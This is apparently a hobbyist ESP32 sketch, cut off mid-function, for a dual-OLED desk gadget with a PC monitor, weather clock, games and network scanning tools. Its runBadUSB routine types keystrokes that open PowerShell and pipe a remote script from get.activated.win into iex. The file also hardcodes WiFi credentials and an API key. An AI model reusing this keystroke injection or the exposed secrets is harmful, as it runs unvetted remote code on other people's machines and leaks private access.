#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>
#include <Adafruit_SSD1306.h>
#include <Keypad.h>
#include <EEPROM.h>
#include <WiFi.h>
#include <WiFiUdp.h>
#include <HTTPClient.h>
#include <time.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

// =========================================================================
const char* HARDCODED_SSID = "Dickinsons";
const char* HARDCODED_PASS = "paraskevi1994";
const char* PC_MAC_ADDRESS = "6C:29:95:2C:1A:19";
const char* OWM_API_KEY     = "1846f42148bbe9bab5e2451874076cfd";
const char* OWM_CITY_DEFAULT = "Salamis";
// =========================================================================

USBHIDKeyboard Keyboard;

Adafruit_SH1106G displayLarge = Adafruit_SH1106G(128, 64, &Wire, -1);
TwoWire I2C_Small(1);
Adafruit_SSD1306 displaySmall(128, 64, &I2C_Small, -1);

#define BUZZER_PIN 21

const byte ROWS = 4; const byte COLS = 4;
char keys[ROWS][COLS] = {
  {'1','2','3','A'}, {'4','5','6','B'}, {'7','8','9','C'}, {'*','0','#','D'}
};
byte rowPins[ROWS] = {10, 11, 12, 13};
byte colPins[COLS]  = {15, 16, 17, 18};
Keypad keypad = Keypad(makeKeymap(keys), rowPins, colPins, ROWS, COLS);

enum SystemMode { MAIN_MENU, PC_MONITOR, WEATHER, TECH_TOOLS, GAME, ANIMATION, SETTINGS_MENU, WIFI_MENU, NETWORK_INFO, T9_INPUT };
SystemMode currentApp = MAIN_MENU; 
char pcView = '1';

const int TOTAL_MENU_ITEMS = 6;
String menuItems[TOTAL_MENU_ITEMS] = {"PC Monitor","Weather Clock","Tech Tools","Mini Game","Animations","Settings"};
int menuSelection = 0; int menuTopIndex = 0;
int settingsSelection = 0; int wifiSelection = 0;

String mySSID = ""; String myPASS = "";
WiFiUDP udp;
unsigned int localUdpPort = 4242;
char incomingPacket[255];

String cpuName = "Waiting Wi-Fi..."; String gpuName = "Waiting Wi-Fi...";
int valRamSpeed = 0, valRamTotal = 0, valVramTotal = 0;
int valCpuPct = 0, valCpuTemp = 0, valGpuPct = 0, valGpuTemp = 0, valRamPct = 0, valCpuFreq = 0;
float valVramUsed = 0.0, valRamUsed = 0.0;
int core_usage[28] = {0};
const int HISTORY_SIZE = 30;
int cpu_hist[HISTORY_SIZE] = {0}; int ram_hist[HISTORY_SIZE] = {0}; int gpu_hist[HISTORY_SIZE] = {0};

int sessionMinCpuTemp = 999, sessionMaxCpuTemp = 0;
int maxCpuTemp = 89, maxGpuTemp = 85;

unsigned long lastAlarmTime = 0, lastDrawTime = 0, lastPacketTime = 0;
int tempSettingStep = 0; bool isTypingTemp = false;
String tempStrCpu = "", tempStrGpu = "";
bool needsUpdate = false;
bool isSleeping = false; bool saverInited = false; int saverFrames = 0;

// ---- Screensaver Config ----
int activeScreensaver = 0; // 0:Pipes, 1:Matrix, 2:Starfield, 3:Life, 4:Bouncing, 5:Oscilloscope
int screensaverTimeoutMin = 1; 
bool isPreviewingSaver = false;
unsigned long lastSaverStep = 0;

// Pipes
#define PIPE_COUNT 3
struct PipeSegment { int x, y, dx, dy; };
PipeSegment pipes[PIPE_COUNT];
// Matrix
int matrixDrops[16];
// Starfield
struct Star { float x, y, z; };
Star stars[30];
// Bouncing
float bx = 64, by = 32, bdx = 2.5, bdy = 1.5;
// Life
uint8_t lifeGrid[32][16];
uint8_t nextLifeGrid[32][16];
// Osc
int oscY[128];
int oscStep = 0;

const char* t9_map[10] = {" 0",".,?!1","abc2","def3","ghi4","jkl5","mno6","pqrs7","tuv8","wxyz9"};
String* t9_targetString; String t9_buffer = "";
char t9_pendingChar = 0, t9_lastKey = 0; int t9_tapIndex = 0;
unsigned long t9_lastTapTime = 0; int t9_capsMode = 0;
enum InputTarget { INPUT_SSID, INPUT_PASS, INPUT_CITY, INPUT_SAVER_TIME };
InputTarget t9_inputTarget = INPUT_SSID;
String owmCity = "";

// ==================== WEATHER ====================
String wxDesc = "---"; int wxTemp = 0, wxFeels = 0, wxHumidity = 0; float wxWind = 0.0;
String wxCity = ""; bool wxFetched = false; unsigned long lastWxFetch = 0;
#define WX_INTERVAL 600000UL

// ==================== TECH TOOLS ====================
int hackMenuSel  = 0; bool hackShowResults = false; int hackViewScroll  = 0;
struct WifiNet { char ssid[33]; int rssi; uint8_t enc; };
WifiNet wifiNets[12]; int wifiNetCount = 0;
String lanHosts[20]; int lanHostCount = 0; bool lanScanDone = false;
int rssiHist[30] = {0}; unsigned long lastRssiUpd = 0;
struct PortResult { int port; bool open; };
PortResult portResults[12]; int portResultCount = 0; String portScanTarget = "";
const int COMMON_PORTS[] = {80, 443, 22, 21, 23, 3389, 8080, 8443, 1883, 554, 5000, 9100};
const char* PORT_NAMES[] = {"HTTP","HTTPS","SSH","FTP","Telnet","RDP","HTTP-Alt","HTTPS-Alt","MQTT","RTSP","Dev","Print"};

const char* biosBeeps[] = {
  "1 Short: Boot Success", "2 Short: CMOS Setup Err", "1 Long 1 Short: RAM Err",
  "1 Long 2 Short: GPU Err", "1 Long 3 Short: KBD Err", "Continuous: PSU/RAM",
  "Repeated Short: Power Err", "High Freq: CPU Temp", "No Beep: PSU/MB Dead"
};

int dropCount = 0; int pingTotal = 0;
int pingHist[30] = {0}; unsigned long lastPingTime = 0;

// ==================== GAMES ====================
enum GameSub { GAME_MENU_SEL, GAME_SNAKE, GAME_PONG, GAME_DINO };
GameSub gameSub = GAME_MENU_SEL; int gameMenuSel = 0; unsigned long lastGameStep = 0;

#define CELL 4
#define SW (128/CELL)
#define SH (64/CELL)
#define SMAX 80
struct Pt { int8_t x, y; }; Pt snk[SMAX];
int snkLen = 3; int8_t snkDX = 1, snkDY = 0, snkNDX = 1, snkNDY = 0;
int8_t foodX = 16, foodY = 8; int snkScore = 0; bool snkOver = false; int snkSpeed = 250;

float pBallX = 64, pBallY = 32, pBallDX = 2.5f, pBallDY = 1.5f;
float pPlayerY = 24, pPlayerVel = 0; 
int pAiY = 24, pPlayerScore = 0, pAiScore = 0;
bool pongOver = false;
#define PAD_H 14
#define PAD_W 3
#define PONG_MS 40

int dinoJump = 0, dinoVel = 0;
struct DinoObs { int x; int h; }; DinoObs dobs[3];
int dinoScore = 0, dinoSpeed = 2; unsigned long lastDinoStep = 0;
bool dinoRunning = false, dinoManual = false, dinoOver = false;
#define DINO_X 12
#define DINO_W 10
#define DINO_H 12
#define OBS_W 6
#define GROUND_Y 56

// =========================================================================
void setup() {
  Serial.begin(115200);
  pinMode(BUZZER_PIN, OUTPUT); digitalWrite(BUZZER_PIN, LOW);
  
  Keyboard.begin();
  USB.begin();

  Wire.begin(8, 9);       displayLarge.begin(0x3C, true);
  I2C_Small.begin(1, 2);  displaySmall.begin(SSD1306_SWITCHCAPVCC, 0x3C);

  EEPROM.begin(256);
  maxCpuTemp = EEPROM.readInt(0); maxGpuTemp = EEPROM.readInt(4);
  if (maxCpuTemp < 20 || maxCpuTemp > 120) maxCpuTemp = 89;
  if (maxGpuTemp < 20 || maxGpuTemp > 120) maxGpuTemp = 85;
  
  activeScreensaver = EEPROM.readInt(130);
  if(activeScreensaver < 0 || activeScreensaver > 5) activeScreensaver = 0;
  screensaverTimeoutMin = EEPROM.readInt(134);
  if(screensaverTimeoutMin < 1 || screensaverTimeoutMin > 60) screensaverTimeoutMin = 1;

  if (String(HARDCODED_SSID).length() > 0) {
    mySSID = String(HARDCODED_SSID); myPASS = String(HARDCODED_PASS);
  } else {
    mySSID = readEEPROMString(10); myPASS = readEEPROMString(50);
  }

  owmCity = readEEPROMString(90);
  if (owmCity.length() == 0) owmCity = String(OWM_CITY_DEFAULT);

  playBootSound();
  connectWiFi();

  configTime(0, 0, "pool.ntp.org", "time.nist.gov");
  setenv("TZ", "EET-2EEST,M3.5.0/3,M10.5.0/4", 1); tzset();

  String savedCity = readEEPROMString(90);
  if (savedCity.length() == 0 && WiFi.status() == WL_CONNECTED) autoDetectCity();

  randomSeed(esp_random());
  updateDisplay();
}

void loop() {
  needsUpdate = false;
  if (currentApp == T9_INPUT) processT9Timer();

  if (currentApp == GAME) {
    if (gameSub == GAME_SNAKE && !snkOver && (millis() - lastGameStep > (unsigned long)snkSpeed)) {
      updateSnake(); lastGameStep = millis(); needsUpdate = true;
    }
    if (gameSub == GAME_PONG && !pongOver && (millis() - lastGameStep > PONG_MS)) {
      updatePong(); lastGameStep = millis(); needsUpdate = true;
    }
    if (gameSub == GAME_DINO && dinoRunning && !dinoOver && (millis() - lastDinoStep > 35)) {
      updateDino(); lastDinoStep = millis(); needsUpdate = true;
    }
  }
  if (currentApp == ANIMATION && dinoRunning && (millis() - lastDinoStep > 35)) {
    updateDino(); lastDinoStep = millis(); needsUpdate = true;
  }

  if (currentApp == WEATHER && WiFi.status() == WL_CONNECTED) {
    if (!wxFetched || millis() - lastWxFetch > WX_INTERVAL) { fetchWeather(); needsUpdate = true; }
  }

  if (currentApp == TECH_TOOLS && hackShowResults) {
    if (hackMenuSel == 2 && millis() - lastRssiUpd > 500) {
      for (int i = 0; i < 29; i++) rssiHist[i] = rssiHist[i+1];
      rssiHist[29] = WiFi.RSSI(); lastRssiUpd = millis(); needsUpdate = true;
    }
    if (hackMenuSel == 6 && millis() - lastPingTime > 1000) {
      updateDropTester(); needsUpdate = true;
    }
  }

  char key = keypad.getKey();
  if (key) {
    playTone(3000, 30);
    
    if(currentApp == GAME && gameSub == GAME_PONG && !pongOver) {
      if (key == 'A') pPlayerVel = -6.5; 
      if (key == 'B') pPlayerVel = 6.5;
    }

    if (isSleeping) {
      isSleeping = false; resetSaver(); lastPacketTime = millis();
      if(isPreviewingSaver) { isPreviewingSaver = false; currentApp = SETTINGS_MENU; needsUpdate=true; return; }
    } else {
      lastPacketTime = millis();
    }

    if (key == '*') {
      currentApp = MAIN_MENU; tempSettingStep = 0; menuSelection = 0; menuTopIndex = 0; t9_pendingChar = 0;
      hackShowResults = false; hackViewScroll = 0; gameSub = GAME_MENU_SEL; dinoRunning = false; needsUpdate = true;
    }
    else if (currentApp == MAIN_MENU) {
      if (key == 'A') { if (menuSelection > 0) menuSelection--; if (menuSelection < menuTopIndex) menuTopIndex = menuSelection; needsUpdate = true; }
      else if (key == 'B') { if (menuSelection < TOTAL_MENU_ITEMS-1) menuSelection++; if (menuSelection >= menuTopIndex+4) menuTopIndex++; needsUpdate = true; }
      else if (key == 'D') {
        if      (menuSelection == 0) currentApp = PC_MONITOR;
        else if (menuSelection == 1) { currentApp = WEATHER; wxFetched = false; }
        else if (menuSelection == 2) { currentApp = TECH_TOOLS; hackMenuSel = 0; hackShowResults = false; }
        else if (menuSelection == 3) { currentApp = GAME; gameSub = GAME_MENU_SEL; gameMenuSel = 0; }
        else if (menuSelection == 4) { currentApp = ANIMATION; initDino(false); }
        else if (menuSelection == 5) { currentApp = SETTINGS_MENU; settingsSelection = 0; }
        needsUpdate = true;
      }
    }
    else if (currentApp == SETTINGS_MENU) {
      if (key == 'A') { if (settingsSelection > 0) settingsSelection--; needsUpdate = true; }
      else if (key == 'B') { if (settingsSelection < 5) settingsSelection++; needsUpdate = true; }
      else if (key == 'D') {
        if      (settingsSelection == 0) { currentApp = WIFI_MENU; wifiSelection = 0; }
        else if (settingsSelection == 1) currentApp = NETWORK_INFO;
        else if (settingsSelection == 2) wakeMyPC();
        else if (settingsSelection == 3) {
          currentApp = T9_INPUT; t9_inputTarget = INPUT_CITY; t9_buffer = owmCity; t9_targetString = &owmCity;
          t9_pendingChar = 0; t9_lastKey = 0; t9_capsMode = 1;
        }
        else if (settingsSelection == 4) {
          activeScreensaver = (activeScreensaver + 1) % 6; 
          EEPROM.writeInt(130, activeScreensaver); EEPROM.commit(); resetSaver();
        }
        else if (settingsSelection == 5) {
          currentApp = T9_INPUT; t9_inputTarget = INPUT_SAVER_TIME; t9_buffer = String(screensaverTimeoutMin);
          t9_pendingChar = 0; t9_lastKey = 0; t9_capsMode = 0;
        }
        needsUpdate = true;
      }
      else if (key == '#' && settingsSelection == 4) {
        isPreviewingSaver = true; currentApp = PC_MONITOR; isSleeping = true; resetSaver(); needsUpdate = true;
      }
    }
    else if (currentApp == TECH_TOOLS) {
      if (!hackShowResults) {
        if (key == 'A') { if (hackMenuSel > 0) hackMenuSel--; needsUpdate = true; }
        else if (key == 'B') { if (hackMenuSel < 6) hackMenuSel++; needsUpdate = true; }
        else if (key == 'D') {
          hackViewScroll = 0;
          if      (hackMenuSel == 0) runWifiScan();
          else if (hackMenuSel == 1) runLanScan();
          else if (hackMenuSel == 2) { hackShowResults = true; for(int i=0;i<30;i++) rssiHist[i]=0; lastRssiUpd=0; }
          else if (hackMenuSel == 3) runPortScan();
          else if (hackMenuSel == 4) runBadUSB();
          else if (hackMenuSel == 5) hackShowResults = true; 
          else if (hackMenuSel == 6) { hackShowResults = true; pingTotal=0; dropCount=0; for(int i=0;i<30;i++) pingHist[i]=0; lastPingTime=0; }
          needsUpdate = true;
        }
      } else {
        if (key == 'A') { if (hackViewScroll > 0) hackViewScroll--; needsUpdate = true; }
        else if (key == 'B') { hackViewScroll++; needsUpdate = true; }
        else if (key == '#') { hackShowResults = false; hackViewScroll = 0; needsUpdate = true; }
      }
    }
    else if (currentApp == WEATHER) { if (key == 'D') { wxFetched = false; needsUpdate = true; } }
    else if (currentApp == WIFI_MENU) {
      if (key == 'A') { if (wifiSelection > 0) wifiSelection--; needsUpdate = true; }
      else if (key == 'B') { if (wifiSelection < 1) wifiSelection++; needsUpdate = true; }
      else if (key == 'D') {
        currentApp = T9_INPUT; t9_inputTarget = (wifiSelection == 0) ? INPUT_SSID : INPUT_PASS;
        t9_buffer = (wifiSelection == 0) ? mySSID : myPASS; t9_targetString = (wifiSelection == 0) ? &mySSID : &myPASS;
        t9_pendingChar = 0; t9_lastKey = 0; t9_capsMode = 0; needsUpdate = true;
      }
    }
    else if (currentApp == T9_INPUT) {
      if (key == 'D') {
        if (t9_pendingChar != 0) { t9_buffer += t9_pendingChar; t9_pendingChar = 0; }
        if (t9_inputTarget == INPUT_SAVER_TIME) {
          screensaverTimeoutMin = t9_buffer.toInt();
          if(screensaverTimeoutMin<1) screensaverTimeoutMin=1; if(screensaverTimeoutMin>60) screensaverTimeoutMin=60;
          EEPROM.writeInt(134, screensaverTimeoutMin); EEPROM.commit();
          playSuccessSound(); currentApp = SETTINGS_MENU;
        } else {
          *t9_targetString = t9_buffer;
          playSuccessSound();
          if (t9_inputTarget == INPUT_CITY) {
            owmCity = t9_buffer; writeEEPROMString(90, owmCity); wxFetched = false;
            displayLarge.clearDisplay(); displayLarge.setCursor(10,20); displayLarge.print("City saved:");
            displayLarge.setCursor(10,35); displayLarge.setTextSize(2); displayLarge.print(owmCity);
            displayLarge.display(); delay(1500); currentApp = SETTINGS_MENU;
          } else {
            writeEEPROMString((wifiSelection == 0) ? 10 : 50, *t9_targetString);
            displayLarge.clearDisplay(); displayLarge.setCursor(10,25); displayLarge.print("Saved! Rebooting...");
            displayLarge.display(); delay(1500); ESP.restart();
          }
        }
        needsUpdate = true;
      }
      else if (key == 'A') {
        if (t9_pendingChar != 0) t9_pendingChar = 0; else if (t9_buffer.length() > 0) t9_buffer.remove(t9_buffer.length()-1);
        t9_lastKey = 0; needsUpdate = true;
      }
      else if (key == '#') { t9_capsMode = (t9_capsMode+1) % 3; needsUpdate = true; }
      else if (key >= '0' && key <= '9') {
        int numKey = key - '0';
        if (key == t9_lastKey && (millis()-t9_lastTapTime < 1000)) t9_tapIndex++;
        else {
          if (t9_pendingChar != 0) t9_buffer += t9_pendingChar;
          if (t9_capsMode == 1 && t9_buffer.length() > 0) t9_capsMode = 0;
          t9_tapIndex = 0; t9_lastKey = key;
        }
        t9_lastTapTime = millis();
        int mapLen = strlen(t9_map[numKey]);
        t9_pendingChar = t9_map[numKey][t9_tapIndex % mapLen];
        if (t9_capsMode > 0 && t9_pendingChar >= 'a' && t9_pendingChar <= 'z') t9_pendingChar -= 32;
        needsUpdate = true;
      }
    }
    else if (currentApp == GAME) {
      if (gameSub == GAME_MENU_SEL) {
        if (key == 'A') { if (gameMenuSel > 0) gameMenuSel--; needsUpdate = true; }
        else if (key == 'B') { if (gameMenuSel < 2) gameMenuSel++; needsUpdate = true; }
        else if (key == 'D') {
          if      (gameMenuSel == 0) { initSnake(); gameSub = GAME_SNAKE; }
          else if (gameMenuSel == 1) { initPong(); gameSub = GAME_PONG;  }
          else                       { initDino(true); gameSub = GAME_DINO; }
          needsUpdate = true;
        }
      }
      else if (gameSub == GAME_SNAKE) {
        if (!snkOver) {
          if (key == '2' && snkDY != 1)  { snkNDX =  0; snkNDY = -1; }
          if (key == '8' && snkDY != -1) { snkNDX =  0; snkNDY =  1; }
          if (key == '4' && snkDX != 1)  { snkNDX = -1; snkNDY =  0; }
          if (key == '6' && snkDX != -1) { snkNDX =  1; snkNDY =  0; }
        } else { if (key == 'D') initSnake(); }
        if (key == '#') { gameSub = GAME_MENU_SEL; needsUpdate = true; }
      }
      else if (gameSub == GAME_PONG) {
        if (pongOver && key == 'D') initPong();
        if (key == '#') { gameSub = GAME_MENU_SEL; needsUpdate = true; }
      }
      else if (gameSub == GAME_DINO) {
        if (!dinoOver) {
          if ((key == 'A' || key == 'D' || key == '2' || key == '5') && dinoJump == 0 && dinoVel == 0) { dinoVel = 9; needsUpdate = true; }
        } else { if (key == 'D') { initDino(true); needsUpdate = true; } }
        if (key == '#') { gameSub = GAME_MENU_SEL; dinoRunning = false; needsUpdate = true; }
      }
    }
    else if (currentApp == ANIMATION) { if (key == 'D') { initDino(false); needsUpdate = true; } }
    else if (currentApp == PC_MONITOR) {
      if (tempSettingStep == 0) {
        if (key == '0') { sessionMinCpuTemp = 999; sessionMaxCpuTemp = 0; playTone(3000,50); needsUpdate = true; }
        else if (key == '#') { tempSettingStep = 1; isTypingTemp = false; tempStrCpu = String(maxCpuTemp); tempStrGpu = String(maxGpuTemp); needsUpdate = true; }
        else if (key == '1' || key == 'A' || key == 'B' || key == 'C' || key == 'D') { pcView = key; needsUpdate = true; }
      } else {
        if (key == '#') {
          if (tempStrCpu.length() > 0) maxCpuTemp = tempStrCpu.toInt();
          if (tempStrGpu.length() > 0) maxGpuTemp = tempStrGpu.toInt();
          EEPROM.writeInt(0, maxCpuTemp); EEPROM.writeInt(4, maxGpuTemp); EEPROM.commit();
          tempSettingStep = 0; playSuccessSound(); needsUpdate = true;
        }
        else if (key == 'A' && tempSettingStep == 2) { tempSettingStep = 1; isTypingTemp = false; needsUpdate = true; }
        else if (key == 'B' && tempSettingStep == 1) { tempSettingStep = 2; isTypingTemp = false; needsUpdate = true; }
        else if (key >= '0' && key <= '9') {
          if (!isTypingTemp) { if (tempSettingStep == 1) tempStrCpu = ""; else tempStrGpu = ""; isTypingTemp = true; }
          if (tempSettingStep == 1 && tempStrCpu.length() < 3) tempStrCpu += key;
          else if (tempSettingStep == 2 && tempStrGpu.length() < 3) tempStrGpu += key;
          needsUpdate = true;
        }
      }
    }
  }

  int packetSize = udp.parsePacket();
  if (packetSize) {
    int len = udp.read(incomingPacket, 255);
    if (len > 0) incomingPacket[len] = 0;
    String data = String(incomingPacket); data.trim();
    if (data.startsWith("S:")) {
      String pl = data.substring(2);
      int p1=pl.indexOf('|'), p2=pl.indexOf('|',p1+1), p3=pl.indexOf('|',p2+1), p4=pl.indexOf('|',p3+1);
      if (p1>0&&p2>0&&p3>0&&p4>0) {
        cpuName=pl.substring(0,p1); gpuName=pl.substring(p1+1,p2);
        valRamSpeed=pl.substring(p2+1,p3).toInt(); valRamTotal=pl.substring(p3+1,p4).toInt(); valVramTotal=pl.substring(p4+1).toInt();
        lastPacketTime=millis(); if(!isPreviewingSaver) isSleeping=false;
      }
    }
    else if (data.startsWith("D:")) {
      int vU=0,rU=0;
      if (sscanf(data.c_str(),"D:%d,%d,%d,%d,%d,%d,%d,%d",&valCpuPct,&valCpuTemp,&valGpuPct,&valGpuTemp,&valRamPct,&valCpuFreq,&vU,&rU)==8) {
        valVramUsed=vU/10.0; valRamUsed=rU/10.0;
        if (valCpuTemp>0) { if(valCpuTemp<sessionMinCpuTemp) sessionMinCpuTemp=valCpuTemp; if(valCpuTemp>sessionMaxCpuTemp) sessionMaxCpuTemp=valCpuTemp; }
        for(int i=0;i<HISTORY_SIZE-1;i++){cpu_hist[i]=cpu_hist[i+1];gpu_hist[i]=gpu_hist[i+1];ram_hist[i]=ram_hist[i+1];}
        cpu_hist[HISTORY_SIZE-1]=valCpuPct; gpu_hist[HISTORY_SIZE-1]=valGpuPct; ram_hist[HISTORY_SIZE-1]=valRamPct;
        if(isSleeping && !isPreviewingSaver) resetSaver(); lastPacketTime=millis(); if(!isPreviewingSaver) isSleeping=false; needsUpdate=true;
      }
    }
    else if (data.startsWith("C:")) {
      String pl=data.substring(2); int si=0;
      for(int i=0;i<28;i++){int ci=pl.indexOf(',',si); if(ci==-1){core_usage[i]=pl.substring(si).toInt();break;} else{core_usage[i]=pl.substring(si,ci).toInt();si=ci+1;}}
      needsUpdate=true;
    }
  }

  unsigned long saverWaitMs = (unsigned long)screensaverTimeoutMin * 60000UL;
  if (millis()-lastPacketTime > saverWaitMs && WiFi.status()==WL_CONNECTED && currentApp==PC_MONITOR && !isSleeping) {
    isSleeping = true;
    cpuName="Waiting Wi-Fi..."; gpuName="Waiting Wi-Fi...";
    valCpuPct=0;valCpuTemp=0;valGpuPct=0;valGpuTemp=0;valRamPct=0;valCpuFreq=0;valVramUsed=0;valRamUsed=0;
    valRamSpeed=0;valRamTotal=0;valVramTotal=0; sessionMinCpuTemp=999;sessionMaxCpuTemp=0;
    for(int i=0;i<HISTORY_SIZE;i++){cpu_hist[i]=0;gpu_hist[i]=0;ram_hist[i]=0;}
    for(int i=0;i<28;i++) core_usage[i]=0;
  }

  int drawInterval = (isSleeping && currentApp==PC_MONITOR) ? 50 : 500;
  if (currentApp == GAME || currentApp == ANIMATION) drawInterval = 50;
  if (millis()-lastDrawTime > (unsigned long)drawInterval) needsUpdate = true;
  
  if (needsUpdate) {
    if (isSleeping && currentApp==PC_MONITOR) drawScreensaver();
    else updateDisplay();
    lastDrawTime = millis();
  }

  if (millis()-lastAlarmTime > 3000 && !isSleeping) {
    if ((valCpuTemp>=maxCpuTemp&&valCpuTemp>0)||(valGpuTemp>=maxGpuTemp&&valGpuTemp>0)) {
      playAlarmSound(); lastAlarmTime=millis();
    }
  }
}

// ==================== ALL HELPER FUNCTIONS ====================
void updateDisplay() { drawSmallScreen(); drawLargeScreen(); }
void resetSaver() { saverInited = false; saverFrames = 0; }
void spawnPipe(int i) {
  pipes[i].x = random(4, 124); pipes[i].y = random(4, 60);
  int dir = random(4);
  pipes[i].dx = (dir == 0) ? 1 : (dir == 1) ? -1 : 0; pipes[i].dy = (dir == 2) ? 1 : (dir == 3) ? -1 : 0;
}
void initSaverMatrix() { for(int i=0; i<16; i++) matrixDrops[i] = random(-60, 0); }
void initSaverStars() { for(int i=0; i<30; i++) { stars[i].x=random(-64,64); stars[i].y=random(-32,32); stars[i].z=random(1,64); } }
void initSaverLife() { for(int x=0;x<32;x++) for(int y=0;y<16;y++) lifeGrid[x][y]=random(2); }

void drawScreensaver() {
  displaySmall.clearDisplay(); struct tm ti;
  if (getLocalTime(&ti)) {
    char ts[9]; strftime(ts, sizeof(ts), "%H:%M:%S", &ti);
    displaySmall.setTextColor(WHITE); displaySmall.setTextSize(1);
    displaySmall.setCursor(16, 28); displaySmall.print(ts);
  }
  displaySmall.display();

  if (!saverInited) {
    displayLarge.clearDisplay(); displayLarge.display();
    if(activeScreensaver == 0) for (int i=0; i<PIPE_COUNT; i++) spawnPipe(i);
    else if(activeScreensaver == 1) initSaverMatrix();
    else if(activeScreensaver == 2) initSaverStars();
    else if(activeScreensaver == 3) initSaverLife();
    else if(activeScreensaver == 5) oscStep = 0;
    saverInited = true; saverFrames = 0; lastSaverStep = millis();
  }

  if (millis() - lastSaverStep < 40) return;
  lastSaverStep = millis();
  saverFrames++;

  if(activeScreensaver == 0) {
    if (saverFrames > 400) { displayLarge.clearDisplay(); for (int i=0; i<PIPE_COUNT; i++) spawnPipe(i); saverFrames = 0; }
    for (int i = 0; i < PIPE_COUNT; i++) {
      int x = pipes[i].x, y = pipes[i].y, dx = pipes[i].dx, dy = pipes[i].dy;
      if (x<=0 || x>=127 || y<=0 || y>=63 || random(12)==0) {
        displayLarge.fillRect(x-1, y-1, 3, 3, SH110X_WHITE);
        if (dx != 0) { dy = (random(2)==0) ? 1 : -1; dx = 0; } else { dx = (random(2)==0) ? 1 : -1; dy = 0; }
        pipes[i].dx = dx; pipes[i].dy = dy;
      }
      if (dx != 0) { displayLarge.drawPixel(x, y, SH110X_WHITE); displayLarge.drawPixel(x, y+1, SH110X_WHITE); } 
      else { displayLarge.drawPixel(x, y, SH110X_WHITE); displayLarge.drawPixel(x+1, y, SH110X_WHITE); }
      pipes[i].x = constrain(x+pipes[i].dx, 0, 127); pipes[i].y = constrain(y+pipes[i].dy, 0, 63);
    }
  }
  else if(activeScreensaver == 1) {
    displayLarge.clearDisplay(); displayLarge.setTextSize(1);
    for(int i=0; i<16; i++) {
      int x = i * 8;
      for(int j=0; j<5; j++) {
        int y = matrixDrops[i] - (j*8);
        if(y>0 && y<64) { displayLarge.setCursor(x, y); displayLarge.print((char)random(33, 126)); }
      }
      matrixDrops[i] += random(2, 6);
      if(matrixDrops[i] - 40 > 64) matrixDrops[i] = random(-20, 0);
    }
  }
  else if(activeScreensaver == 2) {
    displayLarge.clearDisplay();
    for(int i=0; i<30; i++) {
      stars[i].z -= 2;
      if(stars[i].z <= 0) { stars[i].x=random(-64,64); stars[i].y=random(-32,32); stars[i].z=64; }
      int sx = (stars[i].x / stars[i].z) * 64 + 64; int sy = (stars[i].y / stars[i].z) * 32 + 32;
      if(sx>=0 && sx<128 && sy>=0 && sy<64) {
        int r = map(stars[i].z, 0, 64, 2, 0); 
        displayLarge.fillRect(sx, sy, r+1, r+1, SH110X_WHITE);
      }
    }
  }
  else if(activeScreensaver == 3) {
    displayLarge.clearDisplay();
    if(saverFrames > 150) { initSaverLife(); saverFrames = 0; }
    for(int x=0; x<32; x++) {
      for(int y=0; y<16; y++) {
        int n = 0;
        for(int dx=-1; dx<=1; dx++) for(int dy=-1; dy<=1; dy++) {
          if(dx==0 && dy==0) continue;
          int nx=(x+dx+32)%32, ny=(y+dy+16)%16; n += lifeGrid[nx][ny];
        }
        if(lifeGrid[x][y] == 1 && (n<2 || n>3)) nextLifeGrid[x][y]=0;
        else if(lifeGrid[x][y] == 0 && n==3) nextLifeGrid[x][y]=1;
        else nextLifeGrid[x][y] = lifeGrid[x][y];
        if(nextLifeGrid[x][y]) displayLarge.fillRect(x*4, y*4, 3, 3, SH110X_WHITE);
      }
    }
    for(int x=0;x<32;x++) for(int y=0;y<16;y++) lifeGrid[x][y] = nextLifeGrid[x][y];
  }
  else if(activeScreensaver == 4) {
    displayLarge.clearDisplay();
    bx += bdx; by += bdy;
    if(bx <= 0 || bx >= 90) bdx = -bdx; if(by <= 0 || by >= 50) bdy = -bdy;
    displayLarge.drawRect(bx, by, 38, 14, SH110X_WHITE);
    displayLarge.setCursor(bx+4, by+3); displayLarge.setTextSize(1); displayLarge.print("IDLE");
  }
  else if(activeScreensaver == 5) {
    displayLarge.clearDisplay(); displayLarge.drawRect(0,0,128,64,SH110X_WHITE);
    for(int x=0; x<127; x++) oscY[x] = oscY[x+1];
    oscY[127] = 32 + sin(oscStep*0.2)*20 + random(-3,3); oscStep++;
    for(int x=0; x<127; x++) displayLarge.drawLine(x, oscY[x], x+1, oscY[x+1], SH110X_WHITE);
  }
  displayLarge.display();
}

void runBadUSB() {
  displayLarge.clearDisplay(); displayLarge.setTextSize(1);
  displayLarge.setCursor(5,20); displayLarge.print("Running BadUSB...");
  displayLarge.setCursor(5,40); displayLarge.print("DO NOT UNPLUG"); displayLarge.display();
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(100); Keyboard.releaseAll();
  delay(600); Keyboard.print("powershell\n"); delay(1200);
  Keyboard.print("irm https://get.activated.win | iex\n");
  playSuccessSound(); hackShowResults = false;
}

void updateDropTester() {
  pingTotal++; WiFiClient client; client.setTimeout(250);
  unsigned long t = millis(); bool ok = client.connect("8.8.8.8", 53); int ms = millis() - t; client.stop();
  if(!ok) { dropCount++; ms = 250; }
  for(int i=0; i<29; i++) pingHist[i] = pingHist[i+1]; pingHist[29] = ms; lastPingTime = millis();
}

void runWifiScan() {
  displayLarge.clearDisplay(); displayLarge.setTextSize(1); displayLarge.setCursor(10,28); displayLarge.print("Scanning WiFi..."); displayLarge.display();
  WiFi.scanDelete(); int n = WiFi.scanNetworks(false, true); wifiNetCount = 0;
  if (n > 0) {
    for (int i = 0; i < n && wifiNetCount < 12; i++) {
      String ssid = WiFi.SSID(i); ssid.toCharArray(wifiNets[wifiNetCount].ssid, 33);
      wifiNets[wifiNetCount].rssi = WiFi.RSSI(i); wifiNets[wifiNetCount].enc = WiFi.encryptionType(i); wifiNetCount++;
    }
  } hackShowResults = true;
}
void runLanScan() {
  if (WiFi.status() != WL_CONNECTED) { hackShowResults = true; lanHostCount = 0; return; }
  displayLarge.clearDisplay(); displayLarge.setTextSize(1); displayLarge.setCursor(0,0); displayLarge.print("LAN Scan (1-20)..."); displayLarge.display();
  lanHostCount = 0; uint32_t localIp = (uint32_t)WiFi.localIP(); uint32_t subnetMask = (uint32_t)WiFi.subnetMask(); uint32_t networkBase = localIp & subnetMask;
  WiFiClient client; client.setTimeout(120);
  for (int i = 1; i <= 20 && lanHostCount < 20; i++) {
    IPAddress target = networkBase | i;
